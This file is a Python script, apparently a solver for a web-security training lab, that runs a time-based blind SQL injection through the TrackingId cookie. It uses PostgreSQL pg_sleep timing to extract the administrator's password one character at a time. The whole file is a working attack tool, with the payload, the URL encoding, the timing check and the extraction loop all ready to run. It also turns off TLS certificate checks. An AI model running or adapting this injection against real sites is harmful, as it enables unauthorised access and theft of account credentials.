import requests
import urllib
import urllib3
import copy
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_password(url, cookies_in, proxies):
    password_extracted = ""
    for i in range(1, 21):
        dont_continue = False
        for j in range(48, 58):
            sqli_payload = "';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,%s,1)='%s') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--" % (i, chr(j))
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = copy.deepcopy(cookies_in)
            cookies["TrackingId"] = "x" + sqli_payload_encoded
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            # Time the request for time-based sql injection
            elapsed = r.elapsed.total_seconds()
            if(elapsed > 9):
                # character is a hit
                password_extracted += chr(j)
                print("pos %s char %s" % (i, chr(j)))
                dont_continue = True
                break
        
        if(dont_continue == False):
            for j in range(97, 123):
                sqli_payload = "';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,%s,1)='%s') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--" % (i, chr(j))
                sqli_payload_encoded = urllib.parse.quote(sqli_payload)
                cookies = copy.deepcopy(cookies_in)
                cookies["TrackingId"] = "x" + sqli_payload_encoded
                r = requests.get(url, cookies=cookies, verify=False)
                # Time the request for time-based sql injection
                elapsed = r.elapsed.total_seconds()
                if(elapsed > 9):
                    # character is a hit
                    password_extracted += chr(j)
                    print("pos %s char %s" % (i, chr(j)))
                    break

    print("Password: %s" % password_extracted)



def main():
    with open("config.json") as f:
        config = json.load(f)

    if(not("url" in config) or not("TrackingId" in config) or not("session" in config) or not("http_proxy" in config) or not("https_proxy" in config)):
        print("(+) Use the config.json file to configure the script.\n")
        print("(+) For syntax, see the github repo.\n")
        return

    url = config["url"]
    cookies = {
        "TrackingId": config["TrackingId"],
        "session": config["session"]
    }
    proxies = {
        "http": config["http_proxy"],
        "https": config["http_proxy"]
    }
    print("(+) Settings: \nURL: %s\nCookies: %s\nProxies: %s\n" % (url, cookies, proxies))
    print("(+) Retrieving administrator password...\n")
    sqli_password(url, cookies, proxies)

if __name__ == "__main__":
    main()

